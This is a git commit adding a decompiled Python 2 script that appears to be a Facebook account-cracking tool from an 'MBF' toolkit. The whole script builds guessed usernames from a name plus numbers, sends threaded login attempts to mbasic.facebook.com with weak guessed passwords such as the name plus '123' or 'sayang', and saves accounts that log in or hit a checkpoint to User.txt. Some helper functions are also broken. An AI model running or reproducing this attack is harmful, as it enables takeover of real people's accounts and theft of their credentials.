afa2d64302f036e29d69cd9e6864ef5eb47cd8d3
SYBER404 <89589403+SYBER404@users.noreply.github.com>
2021-11-18 17:07:10 +0700

    Add files via upload

---
+++ MBF_V2/c_u.py
@@ -0,0 +1,209 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: /sdcard/RozhakXD/c_u.py
+# Compiled at: 2021-07-02 12:56:56
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(5000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+os.system('rm -rf ..txt')
+for n in range(1000):
+    nmbr = random.randint(1, 999)
+    sys.stdout = open('..txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install tqdm')
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+import itertools, threading
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    os.system('echo -e "[\xe2\x9c\x94] Keluar ! " | lolcat')
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+from tqdm import tqdm
+
+def load():
+    with tqdm(total=100, desc='Loading ', bar_format='{l_bar}{bar}') as (pbar):
+        for i in range(100):
+            time.sleep(0.3)
+            pbar.update(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+okb = []
+id = []
+cpb = []
+cps = []
+done = []
+
+def c_u():
+    os.system('clear')
+    os.system('echo -e " __  __ ____  _____\n|  \\/  | __ )|  ___|\n| |\\/| |  _ \\| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80"| lolcat')
+    try:
+        c = raw_input('\x1b[0;93m[\x1b[0;92m?\x1b[0;93m] \x1b[0;92mNama \x1b[0;93m:\x1b[0;97m ')
+        pw = c + '123'
+        pw2 = c + '1234'
+        pw3 = c + '12345'
+        pw4 = 'sayang'
+        idlist = '..txt'
+        for line in open(idlist, 'r').readlines():
+            id.append(line.strip())
+
+    except IOError:
+        os.system('echo -e "[!] File Not Found ! " | lolcat')
+        raw_input('\x1b[0;93m[\x1b[0;92mKembali\x1b[0;93m]')
+        c_u()
+
+    xxx = str(len(id))
+    jalan('\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m] \x1b[0;92mTotal Username \x1b[0;93m:\x1b[0;97m ' + xxx)
+    time.sleep(1)
+    os.system('echo -e "[\xe2\x9c\x94] Hasil Ok/Cp Tersimpan Di (User.txt)" | lolcat')
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            em = c + user
+            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.1.0.45.119;]'})
+            xo = rex.content
+            if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                print '\x1b[0;92m[Ok] ' + em + '\x1b[0;91m \xe2\x97\x8f \x1b[0;92m' + pw
+                oke = open('User.txt', 'a')
+                oke.write('\n[Ok] ' + em + ' \xe2\x97\x8f ' + pw)
+                oke.close()
+                oks.append(em)
+            elif 'checkpoint' in xo:
+                print '\x1b[0;93m[Cp] ' + em + ' \x1b[0;91m\xe2\x97\x8f\x1b[0;93m ' + pw
+                cek = open('User.txt', 'a')
+                cek.write('\n[Cp] ' + em + ' \xe2\x97\x8f ' + pw)
+                cek.close()
+                cekpoint.append(em)
+            else:
+                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.1.0.45.119;]'})
+                xo = rex.content
+                if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                    print '\x1b[0;92m[Ok] ' + em + '\x1b[0;91m \xe2\x97\x8f\x1b[0;92m ' + pw2
+                    oke = open('User.txt', 'a')
+                    oke.write('\n[Ok] ' + em + ' \xe2\x97\x8f ' + pw2)
+                    oke.close()
+                    oks.append(em)
+                elif 'checkpoint' in xo:
+                    print '\x1b[0;93m[Cp] ' + em + '\x1b[0;91m \xe2\x97\x8f\x1b[0;93m ' + pw2
+                    cek = open('User.txt', 'a')
+                    cek.write('\n[Cp] ' + em + ' \xe2\x97\x8f ' + pw2)
+                    cek.close()
+                    cekpoint.append(em)
+                else:
+                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.1.0.45.119;]'})
+                    xo = rex.content
+                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                        print '\x1b[0;92m[Ok] ' + em + '\x1b[0;91m \xe2\x97\x8f\x1b[0;92m ' + pw3
+                        oke = open('User.txt', 'a')
+                        oke.write('\n[Ok] ' + em + ' \xe2\x97\x8f ' + pw3)
+                        oke.close()
+                        oks.append(em)
+                    elif 'checkpoint' in xo:
+                        print '\x1b[0;93m[Cp] ' + em + '\x1b[0;91m \xe2\x97\x8f\x1b[0;93m ' + pw3
+                        cek = open('User.txt', 'a')
+                        cek.write('\n[Cp] ' + em + ' \xe2\x97\x8f ' + pw3)
+                        cek.close()
+                        cekpoint.append(em)
+                    else:
+                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.1.0.45.119;]'})
+                        xo = rex.content
+                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                            print '\x1b[0;92m[Ok] ' + em + '\x1b[0;91m \xe2\x97\x8f\x1b[0;92m ' + pw4
+                            oke = open('User.txt', 'a')
+                            oke.write('\n[Ok] ' + em + ' \xe2\x97\x8f ' + pw4)
+                            oke.close()
+                            oks.append(em)
+                        elif 'checkpoint' in xo:
+                            print '\x1b[0;93m[Cp] ' + em + '\x1b[0;91m \xe2\x97\x8f\x1b[0;93m ' + pw4
+                            cek = open('User.txt', 'a')
+                            cek.write('\n[Cp] ' + em + ' \xe2\x97\x8f ' + pw4)
+                            cek.close()
+                            cekpoint.append(em)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
+    print '\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m]\x1b[0;92m Selesai\x1b[0;97m...'
+    print '\x1b[0;93m[\x1b[0;92m\xe2\x9c\x94\x1b[0;93m]\x1b[0;97m Total\x1b[0;92m Ok \x1b[0;97m/ \x1b[0;93mCp \x1b[0;97m:\x1b[0;92m ' + str(len(oks)) + '\x1b[0;97m /\x1b[0;93m ' + str(len(cekpoint))
+    os.system('echo -e "\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
+    raw_input('\x1b[0;93m[\x1b[0;92mKembali\x1b[0;93m]')
+    os.system('python2 ok.pyc')
+
+
+if __name__ == '__main__':
+    c_u()
+# okay decompiling c_u.pyc
